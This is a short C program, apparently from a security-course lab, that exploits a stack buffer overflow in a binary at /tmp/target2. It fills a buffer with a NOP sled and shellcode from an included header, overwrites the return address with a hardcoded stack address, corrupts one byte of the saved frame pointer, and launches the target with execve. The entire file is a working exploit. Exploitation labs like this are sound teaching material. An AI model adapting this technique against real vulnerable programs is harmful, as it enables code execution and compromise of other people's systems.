#include "shellcode.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define TARGET "/tmp/target2"
#define NOP 0x90

int main(void) {
  char *args[3];
  char *env[1];
  char buf[162];

  int shell_len = strlen(shellcode);

  memset(buf, NOP, 156 - shell_len);
  memcpy(buf + 156 - shell_len, shellcode, shell_len);
  strcpy(buf + 156, "\x28\xfd\xff\xbf" // expected eip
                    "\xc0");           // overflow to sfp

  args[0] = TARGET;
  args[1] = buf;
  args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
